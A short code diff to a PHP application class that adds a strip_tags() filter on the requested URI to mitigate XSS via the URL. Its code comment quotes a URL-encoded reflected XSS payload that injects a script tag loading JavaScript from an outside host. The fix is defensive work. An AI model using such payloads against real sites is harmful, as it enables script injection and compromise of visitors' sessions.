@@ -1877,7 +1877,10 @@ class Ayoola_Application
         {
             $requestedUri = '/' . array_pop( explode( $controller, $requestedUri ) );
         }
-        
+
+        //  mitigate XSS attacks via URL
+        //  http://localhost:8888/search/foo%22%3E%3Cscript%20src=//dtf.pw/2.js%3E%3C/script%3E%3Cx=%22?
+        $requestedUri = strip_tags( $requestedUri );
 
 		//	Fetch the GET parameters from the url
 		require_once 'Ayoola/Filter/Get.php';
